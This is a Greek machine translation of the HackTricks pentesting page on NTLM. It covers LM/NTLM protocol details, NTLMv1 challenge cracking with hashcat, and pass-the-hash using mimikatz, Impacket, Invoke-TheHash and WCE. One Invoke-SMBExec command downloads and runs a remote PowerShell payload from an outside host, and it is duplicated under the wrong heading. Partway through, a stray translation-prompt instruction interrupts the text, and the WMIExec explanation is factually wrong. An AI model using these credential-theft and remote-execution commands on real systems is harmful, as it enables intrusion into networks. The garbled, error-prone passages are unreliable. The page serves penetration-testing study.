# NTLM

<details>

<summary><strong>Μάθετε το χάκινγκ στο AWS από το μηδέν μέχρι τον ήρωα με το</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

* Εργάζεστε σε μια **εταιρεία κυβερνοασφάλειας**; Θέλετε να δείτε την **εταιρεία σας να διαφημίζεται στο HackTricks**; Ή θέλετε να έχετε πρόσβαση στην **τελευταία έκδοση του PEASS ή να κατεβάσετε το HackTricks σε μορφή PDF**; Ελέγξτε τα [**ΣΧΕΔΙΑ ΣΥΝΔΡΟΜΗΣ**](https://github.com/sponsors/carlospolop)!
* Ανακαλύψτε την [**Οικογένεια PEASS**](https://opensea.io/collection/the-peass-family), τη συλλογή μας από αποκλειστικά [**NFTs**](https://opensea.io/collection/the-peass-family)
* Αποκτήστε το [**επίσημο PEASS & HackTricks swag**](https://peass.creator-spring.com)
* **Συμμετάσχετε** [**💬**](https://emojipedia.org/speech-balloon/) **στην ομάδα Discord**]\(https://discord.gg/hRep4RUj7f) ή στην [**ομάδα telegram**](https://t.me/peass) ή **ακολουθήστε** με στο **Twitter** 🐦[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Μοιραστείτε τα χάκινγκ κόλπα σας υποβάλλοντας PRs στο** [**αποθετήριο hacktricks**](https://github.com/carlospolop/hacktricks) **και** [**αποθετήριο hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

## Βασικές Πληροφορίες

Σε περιβάλλοντα όπου λειτουργούν τα **Windows XP και Server 2003**, χρησιμοποιούνται τα hashes του LM (Lan Manager), αν και είναι γνωστό ότι αυτά μπορούν εύκολα να διαρρεύσουν. Ένα συγκεκριμένο hash του LM, `AAD3B435B51404EEAAD3B435B51404EE`, υποδηλώνει μια περίπτωση όπου δεν χρησιμοποιείται το LM, αντιπροσωπεύοντας το hash για μια κενή συμβολοσειρά.

Από προεπιλογή, το πρωτόκολλο πιστοποίησης **Kerberos** είναι η κύρια μέθοδος που χρησιμοποιείται. Το NTLM (NT LAN Manager) εμφανίζεται σε συγκεκριμένες περιπτώσεις: απουσία του Active Directory, μη ύπαρξη του τομέα, δυσλειτουργία του Kerberos λόγω εσφαλμένης ρύθμισης ή όταν γίνονται προσπάθειες σύνδεσης χρησιμοποιώντας μια διεύθυνση IP αντί για ένα έγκυρο όνομα κεντρικού υπολογιστή.

Η παρουσία του κεφαλίδας **"NTLMSSP"** στα πακέτα δικτύου υποδεικνύει ένα διαδικασία πιστοποίησης NTLM.

Η υποστήριξη για τα πρωτόκολλα πιστοποίησης - LM, NTLMv1 και NTLMv2 - διευκολύνεται από ένα συγκεκριμένο DLL που βρίσκεται στη διαδρομή `%windir%\Windows\System32\msv1\_0.dll`.

**Βασικά Σημεία**:

* Τα hashes του LM είναι ευάλωτα και ένα κενό hash του LM (`AAD3B435B51404EEAAD3B435B51404EE`) υποδηλώνει τη μη χρήση του.
* Το Kerberos είναι η προεπιλεγμένη μέθοδος πιστοποίησης, με το NTLM να χρησιμοποιείται μόνο υπό συγκεκριμένες συνθήκες.
* Τα πακέτα πιστοποίησης NTLM είναι αναγνωρίσιμα από τον κεφαλίδα "NTLMSSP".
* Τα πρωτόκολλα LM, NTLMv1 και NTLMv2 υποστηρίζονται από το αρχείο συστήματος `msv1\_0.dll`.

## LM, NTLMv1 και NTLMv2

Μπορείτε να ελέγξετε και να ρυθμίσετε ποιο πρωτόκολλο θα χρησιμοποιηθεί:

### Γραφική Διεπαφή Χρήστη (GUI)

Εκτελέστε το _secpol.msc_ -> Τοπικές πολιτικές -> Επιλογές ασφάλειας -> Ασφάλεια δικτύου: Επίπεδο πιστοποίησης LAN Manager. Υπάρχουν 6 επίπεδα (από 0 έως 5).

![](<../../.gitbook/assets/image (92).png>)

### Μητρώο (Registry)

Αυτό θα ορίσει το επίπεδο 5:

```
reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa\ /v lmcompatibilitylevel /t REG_DWORD /d 5 /f
```

Δυνατές τιμές:

```
0 - Send LM & NTLM responses
1 - Send LM & NTLM responses, use NTLMv2 session security if negotiated
2 - Send NTLM response only
3 - Send NTLMv2 response only
4 - Send NTLMv2 response only, refuse LM
5 - Send NTLMv2 response only, refuse LM & NTLM
```

## Βασική διαδικασία ελέγχου ταυτότητας NTLM Domain

1. Ο **χρήστης** εισάγει τα **διαπιστευτήριά του**
2. Η μηχανή πελάτης **στέλνει ένα αίτημα ελέγχου ταυτότητας** αποστέλλοντας το **όνομα του τομέα** και το **όνομα χρήστη**
3. Ο **διακομιστής** στέλνει την **πρόκληση**
4. Ο **πελάτης κρυπτογραφεί** την **πρόκληση** χρησιμοποιώντας το κατακερματισμένο συνθηματικό ως κλειδί και την αποστέλλει ως απάντηση
5. Ο **διακομιστής αποστέλλει** στον **ελεγκτή τομέα** το **όνομα του τομέα, το όνομα χρήστη, την πρόκληση και την απάντηση**. Εάν δεν έχει ρυθμιστεί ένας ενεργός κατάλογος ή το όνομα του τομέα είναι το όνομα του διακομιστή, τα διαπιστευτήρια ελέγχονται τοπικά.
6. Ο **ελεγκτής τομέα ελέγχει εάν όλα είναι σωστά** και αποστέλλει τις πληροφορίες στον διακομιστή

Ο **διακομιστής** και ο **ελεγκτής τομέα** μπορούν να δημιουργήσουν ένα **ασφαλές κανάλι** μέσω του διακομιστή **Netlogon**, καθώς ο ελεγκτής τομέα γνωρίζει το συνθηματικό του διακομιστή (βρίσκεται μέσα στη βάση δεδομένων **NTDS.DIT**).

### Τοπική διαδικασία ελέγχου ταυτότητας NTLM

Ο έλεγχος ταυτότητας είναι όπως αναφέρθηκε **προηγουμένως, αλλά** ο **διακομιστής γνωρίζει τον κατακερματισμένο κωδικό του χρήστη** που προσπαθεί να ελεγχθεί μέσα στο αρχείο **SAM**. Έτσι, αντί να ζητήσει από τον ελεγκτή τομέα, ο **διακομιστής θα ελέγξει μόνος του** εάν ο χρήστης μπορεί να ελεγχθεί.

### Πρόκληση NTLMv1

Το μήκος της **πρόκλησης είναι 8 bytes** και η **απάντηση είναι 24 bytes**.

Το **κατακερματισμένο NT (16bytes)** διαιρείται σε **3 μέρη των 7bytes έκαστο** (7B + 7B + (2B+0x00\*5)): το **τελευταίο μέρος γεμίζει με μηδενικά**. Στη συνέχεια, η **πρόκληση** κρυπτογραφείται ξεχωριστά με κάθε μέρος και τα **αποτελέσματα** της κρυπτογράφησης συνδέονται. Σύνολο: 8B + 8B + 8B = 24Bytes.

**Προβλήματα**:

* Έλλειψη **τυχαιότητας**
* Τα 3 μέρη μπορούν να **επιτεθούν ξεχωριστά** για να βρεθεί το κατακερματισμένο NT
* Το **DES είναι ευάλωτο** σε επίθεση
* Το 3ο κλειδί αποτελείται πάντα από **5 μηδενικά**
* Δεδομένης της **ίδιας πρόκλησης**, η **απάντηση** θα είναι **ίδια**. Έτσι, μπορείτε να δώσετε ως **πρόκληση** στο θύμα τον χαρακτήρα "**1122334455667788**" και να επιτεθείτε στην απάντηση χρησιμοποιώντας **προ-υπολογισμένους πίνακες ουράνιου τόξου**.

### Επίθεση NTLMv1

Σήμερα είναι λιγότερο συνηθισμένο να βρείτε περιβάλλοντα με ρυθμισμένη Απεριόριστη Ανάθεση, αλλά αυτό δεν σημαίνει ότι δεν μπορείτε να **καταχραστείτε έναν υπηρεσία εκτύπωσης** που έχει ρυθμιστεί.

Μπορείτε να καταχραστείτε ορισμένα διαπιστευτήρια/συνεδρίες που ήδη έχετε στον AD για να **ζητήσετε από τον εκτυπωτή να ελεγχθεί** έναν **κόμβο υπό τον έλεγχό σας**. Στη συνέχεια, χρησιμοποιώντας το `metasploit auxiliary/server/capture/smb` ή το `responder`, μπορείτε να **ορίσετε την πρόκληση ελέγχου ταυτότητας σε 1122334455667788**, να καταγράψετε την προσπάθεια ελέγχου ταυτότητας και αν αυτή έγινε χρησιμοποιώντας **NTLMv1** θα μπορέσετε να την **αποκρυπτογραφήσετε**.\
Εάν χρησιμοποιείτε το `responder`, μπορείτε να **δοκιμάσετε να χρησιμοποιήσετε τη σημαία `--lm`** για να προσπαθήσετε να **υποβαθμίσετε** τον **έλεγχο ταυτότητας**.\
_Σημειώστε ότι για αυτήν την τεχνική ο έλεγχος ταυτότητας πρέπει να γίνεται χρησιμοποιώντας NTLMv1 (το NTLMv2 δεν είναι έγκυρο)._

Να θυμάστε ότι ο εκτυπωτής θα χρησιμοποιήσει τον λογαριασμό υπολογιστή κατά τη διάρκεια του ελέγχου ταυτότητας και οι λογαριασμοί υπολογιστών χρησιμοποιούν **μακριά και τυχαία συνθηματικά** που πιθανότατα δεν θα μπορέσετε να αποκρυπτογραφήσετε χρησιμοποιώντας συνηθισμένα **λεξικά**. Ωστόσο, ο έλεγχος ταυτότητας **NTLMv1** χρησιμοποιεί το DES ([περισσότερες πληροφορίες εδώ](./#ntlmv1-challenge)), οπότε χρησιμοποιώντας ορισμένες υπηρεσίες που είναι ειδικά αφιερωμένες στην αποκρυπτογράφηση DES θα μπορέσετε να το αποκ

```bash
python3 ntlmv1.py --ntlmv1 hashcat::DUSTIN-5AA37877:76365E2D142B5612980C67D057EB9EFEEE5EF6EB6FF6E04D:727B4E35F947129EA52B9CDEDAE86934BB23EF89F50FC595:1122334455667788
```

Θα εξάγατε το παρακάτω:

```bash
['hashcat', '', 'DUSTIN-5AA37877', '76365E2D142B5612980C67D057EB9EFEEE5EF6EB6FF6E04D', '727B4E35F947129EA52B9CDEDAE86934BB23EF89F50FC595', '1122334455667788']

Hostname: DUSTIN-5AA37877
Username: hashcat
Challenge: 1122334455667788
LM Response: 76365E2D142B5612980C67D057EB9EFEEE5EF6EB6FF6E04D
NT Response: 727B4E35F947129EA52B9CDEDAE86934BB23EF89F50FC595
CT1: 727B4E35F947129E
CT2: A52B9CDEDAE86934
CT3: BB23EF89F50FC595

To Calculate final 4 characters of NTLM hash use:
./ct3_to_ntlm.bin BB23EF89F50FC595 1122334455667788

To crack with hashcat create a file with the following contents:
727B4E35F947129E:1122334455667788
A52B9CDEDAE86934:1122334455667788

To crack with hashcat:
./hashcat -m 14000 -a 3 -1 charsets/DES_full.charset --hex-charset hashes.txt ?1?1?1?1?1?1?1?1

To Crack with crack.sh use the following token
NTHASH:727B4E35F947129EA52B9CDEDAE86934BB23EF89F50FC595
```

Δημιουργήστε ένα αρχείο με το περιεχόμενο:

```bash
727B4E35F947129E:1122334455667788
A52B9CDEDAE86934:1122334455667788
```

Εκτελέστε το hashcat (καλύτερα διανεμημένο μέσω ενός εργαλείου όπως το hashtopolis), διότι αλλιώς θα χρειαστούν αρκετές ημέρες.

```bash
./hashcat -m 14000 -a 3 -1 charsets/DES_full.charset --hex-charset hashes.txt ?1?1?1?1?1?1?1?1
```

Σε αυτήν την περίπτωση γνωρίζουμε ότι ο κωδικός πρόσβασης είναι "password", οπότε θα κάνουμε απάτη για διαδικαστικούς λόγους:

```bash
python ntlm-to-des.py --ntlm b4b9b02e6f09a9bd760f388b67351e2b
DESKEY1: b55d6d04e67926
DESKEY2: bcba83e6895b9d

echo b55d6d04e67926>>des.cand
echo bcba83e6895b9d>>des.cand
```

Τώρα πρέπει να χρησιμοποιήσουμε τα εργαλεία του hashcat για να μετατρέψουμε τα σπασμένα κλειδιά des σε μέρη του NTLM hash:

```bash
./hashcat-utils/src/deskey_to_ntlm.pl b55d6d05e7792753
b4b9b02e6f09a9 # this is part 1

./hashcat-utils/src/deskey_to_ntlm.pl bcba83e6895b9d
bd760f388b6700 # this is part 2
```

Τελικά η τελευταία μέρα:

```bash
./hashcat-utils/src/ct3_to_ntlm.bin BB23EF89F50FC595 1122334455667788

586c # this is the last part
```

Το ακόλουθο περιεχόμενο είναι από ένα βιβλίο για χάκινγκ σχετικά με τεχνικές χάκινγκ. Το παρακάτω περιεχόμενο είναι από το αρχείο /hive/hacktricks/windows-hardening/ntlm/README.md. Μεταφράστε το σχετικό αγγλικό κείμενο στα ελληνικά και επιστρέψτε τη μετάφραση διατηρώντας ακριβώς την ίδια σύνταξη markdown και html. Μην μεταφράσετε πράγματα όπως κώδικας, ονόματα τεχνικών χάκινγκ, χάκινγκ λέξεις, ονόματα πλατφορμών cloud/SaaS (όπως Workspace, aws, gcp...), η λέξη 'διαρροή', pentesting και ετικέτες markdown. Επίσης, μην προσθέσετε κανένα επιπλέον περιεχόμενο εκτός από τη μετάφραση και τη σύνταξη markdown.

```bash
NTHASH=b4b9b02e6f09a9bd760f388b6700586c
```

### NTLMv2 Πρόκληση

Το μήκος της πρόκλησης είναι 8 bytes και στέλνονται 2 απαντήσεις: Μία είναι 24 bytes και το μήκος της άλλης είναι μεταβλητό.

Η πρώτη απάντηση δημιουργείται κρυπτογραφώντας χρησιμοποιώντας HMAC\_MD5 το string που αποτελείται από τον πελάτη και τον τομέα και χρησιμοποιώντας ως κλειδί το hash MD4 του NT hash. Στη συνέχεια, το αποτέλεσμα θα χρησιμοποιηθεί ως κλειδί για να κρυπτογραφηθεί χρησιμοποιώντας HMAC\_MD5 η πρόκληση. Σε αυτό, θα προστεθεί μια πρόκληση πελάτη 8 bytes. Σύνολο: 24 B.

Η δεύτερη απάντηση δημιουργείται χρησιμοποιώντας αρκετές τιμές (μια νέα πρόκληση πελάτη, ένα χρονικό σημείο για να αποφευχθούν επαναληπτικές επιθέσεις...).

Εάν έχετε ένα pcap που έχει καταγράψει ένα επιτυχημένο διαδικασία πιστοποίησης, μπορείτε να ακολουθήσετε αυτόν τον οδηγό για να λάβετε τον τομέα, το όνομα χρήστη, την πρόκληση και την απάντηση και να προσπαθήσετε να αποκτήσετε τον κωδικό πρόσβασης: [https://research.801labs.org/cracking-an-ntlmv2-hash/](https://research.801labs.org/cracking-an-ntlmv2-hash/)

## Pass-the-Hash

Μόλις έχετε το hash του θύματος, μπορείτε να το χρησιμοποιήσετε για να προσομοιώσετε το θύμα.

Χρειάζεστε ένα εργαλείο που θα πραγματοποιήσει την πιστοποίηση NTLM χρησιμοποιώντας αυτό το hash, ή μπορείτε να δημιουργήσετε ένα νέο sessionlogon και να εισαγάγετε αυτό το hash μέσα στο LSASS, έτσι ώστε όταν πραγματοποιείται οποιαδήποτε πιστοποίηση NTLM, θα χρησιμοποιηθεί αυτό το hash. Η τελευταία επιλογή είναι αυτό που κάνει το mimikatz.

Παρακαλώ, θυμηθείτε ότι μπορείτε να πραγματοποιήσετε επιθέσεις Pass-the-Hash χρησιμοποιώντας επίσης λογαριασμούς Υπολογιστή.

### Mimikatz

Πρέπει να εκτελεστεί ως διαχειριστής

```bash
Invoke-Mimikatz -Command '"sekurlsa::pth /user:username /domain:domain.tld /ntlm:NTLMhash /run:powershell.exe"'
```

Αυτό θα ξεκινήσει ένα διεργασία που θα ανήκει στους χρήστες που έχουν εκτελέσει το mimikatz, αλλά εσωτερικά στο LSASS, οι αποθηκευμένες πιστοποιητικές πληροφορίες είναι αυτές που βρίσκονται μέσα στις παραμέτρους του mimikatz. Έπειτα, μπορείτε να έχετε πρόσβαση σε δικτυακούς πόρους ως αν ήσασταν αυτός ο χρήστης (παρόμοιο με το κόλπο `runas /netonly`, αλλά δεν χρειάζεται να γνωρίζετε τον κωδικό πρόσβασης σε απλό κείμενο).

### Pass-the-Hash από το Linux

Μπορείτε να αποκτήσετε εκτέλεση κώδικα σε μηχανήματα Windows χρησιμοποιώντας το Pass-the-Hash από το Linux.\
[**Προσπελάστε εδώ για να μάθετε πώς να το κάνετε.**](https://github.com/carlospolop/hacktricks/blob/gr/windows/ntlm/broken-reference/README.md)

### Εργαλεία Impacket για Windows

Μπορείτε να κατεβάσετε δυαδικά αρχεία impacket για Windows εδώ: [https://github.com/ropnop/impacket\_static\_binaries/releases/tag/0.9.21-dev-binaries](https://github.com/ropnop/impacket\_static\_binaries/releases/tag/0.9.21-dev-binaries).

* **psexec\_windows.exe** `C:\AD\MyTools\psexec_windows.exe -hashes ":b38ff50264b74508085d82c69794a4d8" svcadmin@dcorp-mgmt.my.domain.local`
* **wmiexec.exe** `wmiexec_windows.exe -hashes ":b38ff50264b74508085d82c69794a4d8" svcadmin@dcorp-mgmt.dollarcorp.moneycorp.local`
* **atexec.exe** (Σε αυτήν την περίπτωση πρέπει να καθορίσετε μια εντολή, οι cmd.exe και powershell.exe δεν είναι έγκυρες για να αποκτήσετε μια διαδραστική κέλυφος)`C:\AD\MyTools\atexec_windows.exe -hashes ":b38ff50264b74508085d82c69794a4d8" svcadmin@dcorp-mgmt.dollarcorp.moneycorp.local 'whoami'`
* Υπάρχουν και άλλα δυαδικά αρχεία Impacket...

### Invoke-TheHash

Μπορείτε να αποκτήσετε τα scripts powershell από εδώ: [https://github.com/Kevin-Robertson/Invoke-TheHash](https://github.com/Kevin-Robertson/Invoke-TheHash)

#### Invoke-SMBExec

```bash
Invoke-SMBExec -Target dcorp-mgmt.my.domain.local -Domain my.domain.local -Username username -Hash b38ff50264b74508085d82c69794a4d8 -Command 'powershell -ep bypass -Command "iex(iwr http://172.16.100.114:8080/pc.ps1 -UseBasicParsing)"' -verbose
```

#### Invoke-WMIExec

Ο `Invoke-WMIExec` είναι ένα εργαλείο PowerShell που χρησιμοποιείται για να εκτελέσει εντολές σε απομακρυσμένους υπολογιστές μέσω του πρωτοκόλλου WMI (Windows Management Instrumentation). Αυτό το εργαλείο εκμεταλλεύεται την αδυναμία του πρωτοκόλλου WMI να απαιτεί ελέγχους ταυτότητας, επιτρέποντας σε έναν επιτιθέμενο να εκτελέσει κακόβουλο κώδικα σε έναν απομακρυσμένο υπολογιστή.

Για να χρησιμοποιήσετε το `Invoke-WMIExec`, απλά εκτελέστε το PowerShell script και παρέχετε τις απαραίτητες παραμέτρους, όπως το όνομα χρήστη και ο κωδικός πρόσβασης για τον απομακρυσμένο υπολογιστή. Το εργαλείο θα εκτελέσει την εντολή που έχετε καθορίσει στον απομακρυσμένο υπολογιστή και θα επιστρέψει τα αποτελέσματα στον υπολογιστή εκτέλεσης.

Είναι σημαντικό να σημειωθεί ότι η χρήση του `Invoke-WMIExec` για εκτέλεση εντολών σε απομακρυσμένους υπολογιστές απαιτεί δικαιώματα διαχειριστή στον απομακρυσμένο υπολογιστή. Επίσης, πρέπει να ληφθούν υπόψη οι επιπτώσεις ασφαλείας και να χρησιμοποιηθεί με προσοχή.

```bash
Invoke-SMBExec -Target dcorp-mgmt.my.domain.local -Domain my.domain.local -Username username -Hash b38ff50264b74508085d82c69794a4d8 -Command 'powershell -ep bypass -Command "iex(iwr http://172.16.100.114:8080/pc.ps1 -UseBasicParsing)"' -verbose
```

#### Εκτέλεση-SMBClient

```bash
Invoke-SMBClient -Domain dollarcorp.moneycorp.local -Username svcadmin -Hash b38ff50264b74508085d82c69794a4d8 [-Action Recurse] -Source \\dcorp-mgmt.my.domain.local\C$\ -verbose
```

#### Εκτέλεση-SMBEnum

```bash
Invoke-SMBEnum -Domain dollarcorp.moneycorp.local -Username svcadmin -Hash b38ff50264b74508085d82c69794a4d8 -Target dcorp-mgmt.dollarcorp.moneycorp.local -verbose
```

#### Invoke-TheHash

Αυτή η συνάρτηση είναι ένας **συνδυασμός** όλων των άλλων. Μπορείτε να περάσετε **πολλούς υπολογιστές**, να **αποκλείσετε** κάποιους και να **επιλέξετε** τη **επιλογή** που θέλετε να χρησιμοποιήσετε (_SMBExec, WMIExec, SMBClient, SMBEnum_). Εάν επιλέξετε **οποιαδήποτε** από τις **SMBExec** και **WMIExec**, αλλά δεν δώσετε κανένα παράμετρο _**Command**_, απλώς θα **ελέγξει** αν έχετε **επαρκή δικαιώματα**.

```
Invoke-TheHash -Type WMIExec -Target 192.168.100.0/24 -TargetExclude 192.168.100.50 -Username Administ -ty    h F6F38B793DB6A94BA04A52F1D3EE92F0
```

### [Κακόβουλο-WinRM Pass the Hash](../../network-services-pentesting/5985-5986-pentesting-winrm.md#using-evil-winrm)

### Επεξεργαστής Πιστοποιητικών των Windows (WCE)

**Πρέπει να εκτελεστεί ως διαχειριστής**

Αυτό το εργαλείο θα κάνει το ίδιο πράγμα με το mimikatz (τροποποίηση της μνήμης του LSASS).

```
wce.exe -s <username>:<domain>:<hash_lm>:<hash_nt>
```

### Εκτέλεση απομακρυσμένων εντολών σε Windows με όνομα χρήστη και κωδικό πρόσβασης

{% content-ref url="../lateral-movement/" %}
[lateral-movement](../lateral-movement/)
{% endcontent-ref %}

## Εξαγωγή διαπιστευτηρίων από έναν Windows υπολογιστή

**Για περισσότερες πληροφορίες σχετικά με το πώς να αποκτήσετε διαπιστευτήρια από έναν Windows υπολογιστή, πρέπει να διαβάσετε αυτήν τη σελίδα** [**εδώ**](https://github.com/carlospolop/hacktricks/blob/gr/windows-hardening/ntlm/broken-reference/README.md)**.**

## NTLM Relay και Responder

**Διαβάστε περισσότερες λεπτομερείς οδηγίες σχετικά με το πώς να πραγματοποιήσετε αυτές τις επιθέσεις εδώ:**

{% content-ref url="../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md" %}
[spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md)
{% endcontent-ref %}

## Ανάλυση προκλήσεων NTLM από ένα καταγραφή δικτύου

**Μπορείτε να χρησιμοποιήσετε το** [**https://github.com/mlgualtieri/NTLMRawUnHide**](https://github.com/mlgualtieri/NTLMRawUnHide)

<details>

<summary><strong>Μάθετε το hacking στο AWS από το μηδέν μέχρι τον ήρωα με το</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

* Εργάζεστε σε μια **εταιρεία κυβερνοασφάλειας**; Θέλετε να δείτε την **εταιρεία σας να διαφημίζεται στο HackTricks**; Ή θέλετε να έχετε πρόσβαση στην **τελευταία έκδοση του PEASS ή να κατεβάσετε το HackTricks σε μορφή PDF**; Ελέγξτε τα [**ΣΧΕΔΙΑ ΣΥΝΔΡΟΜΗΣ**](https://github.com/sponsors/carlospolop)!
* Ανακαλύψτε [**την Οικογένεια PEASS**](https://opensea.io/collection/the-peass-family), τη συλλογή μας από αποκλειστικά [**NFTs**](https://opensea.io/collection/the-peass-family)
* Αποκτήστε το [**επίσημο PEASS & HackTricks swag**](https://peass.creator-spring.com)
* **Εγγραφείτε στην** [**💬**](https://emojipedia.org/speech-balloon/) [**ομάδα Discord**](https://discord.gg/hRep4RUj7f) ή στην [**ομάδα τηλεγραφήματος**](https://t.me/peass) ή **ακολουθήστε** με στο **Twitter** 🐦[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Μοιραστείτε τα κόλπα σας στο hacking υποβάλλοντας PRs στο** [**αποθετήριο hacktricks**](https://github.com/carlospolop/hacktricks) **και** [**αποθετήριο hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
